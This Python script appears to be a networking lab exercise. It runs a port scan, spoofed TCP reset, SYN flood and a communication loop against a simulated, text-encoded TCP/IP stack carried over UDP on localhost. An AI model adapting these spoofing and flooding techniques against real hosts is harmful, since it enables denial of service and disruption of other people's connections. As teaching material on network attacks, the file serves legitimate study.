import socket
import time

import config1
from util import *


class Client:
    def __init__(self, my_port):
        self.s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
        self.port = my_port
        self.IP = config1.IP
        self.s.bind((config1.IP, self.port))
        self.s.settimeout(0.5)

    def get_msg(self):
        try:
            msg, address = self.s.recvfrom(config1.buffer_size)
        except Exception as e:
            print(e)
            return None

        return msg.decode()

    def send_to_port(self, port_to, ip_from=config1.IP, ip_to=config1.IP, port_from=None, **kwargs):
        if port_from is None:
            port_from = self.port
        tcp_msg = build_tcp_message(port_from, port_to, **kwargs)
        ip_msg = build_ip_message(ip_from=ip_from, ip_to=ip_to, data=tcp_msg)
        self.s.sendto(ip_msg.encode(), (ip_to, port_to))


def passive_scan():
    client = Client(22222)

    ccasks = 0
    misses = 0
    for port in range(20000, 20005):
        client.send_to_port(port, syn='1')
        ccasks += 1
    print('Asked all')
    to_attack_addr = set()
    for i in range(ccasks):
        msg = client.get_msg()
        if not msg:
            misses += 1
            continue
        m = parse_tcp_ip_message(msg)
        if not tcp_ip_checks(m, client.IP):
            continue
        print(m)
        if m['syn'] == '1' and m['ack'] == '1':
            to_attack_addr.add(m['port_from'])

    print('Passive scan finished, total ports = {}, daemons found on {} ports'.format(ccasks - misses, len(to_attack_addr)))
    print(to_attack_addr)


def tcp_reset():
    ip_to = '127.0.0.1'
    port_vict = int(input('What port to attack?\n'))

    client = Client(22223)

    for x in range(1, 10):
        ip_from = '127.0.0.{}'.format(x)
        client.send_to_port(port_vict, ip_from=ip_from, ip_to=ip_to, rst='1', port_from=22222)


def communicate():
    port_server = int(input('What port to communicate?'))
    client = Client(22222)

    for i in range(1000000000):
        client.send_to_port(port_server, data=tobin(i, 32))
        msg = client.get_msg()
        if not msg:
            print('No server on that port')
            break
        m = parse_tcp_ip_message(msg)
        if not tcp_ip_checks(m, client.IP):
            break
        print(m)
        if m['rst'] == '1':
            print('he asked to stop')
            break
        time.sleep(1)


def syn_flooding():
    port_vict = int(input('What port to attack?\n'))
    client = Client(22222)

    for x in range(2, 50):
        ip_from = '127.0.0.{}'.format(x)
        client.send_to_port(port_vict, ip_from=ip_from, syn='1')


if __name__ == '__main__':
    mode = input('Choose attack? ps/rst/synf/rst-com\n\r')
    if mode == 'ps':
        passive_scan()
    elif mode == 'rst':
        tcp_reset()
    elif mode == 'synf':
        syn_flooding()
    elif mode == 'rst-com':
        communicate()
    else:
        print('Unknown attack {}'.format(mode))
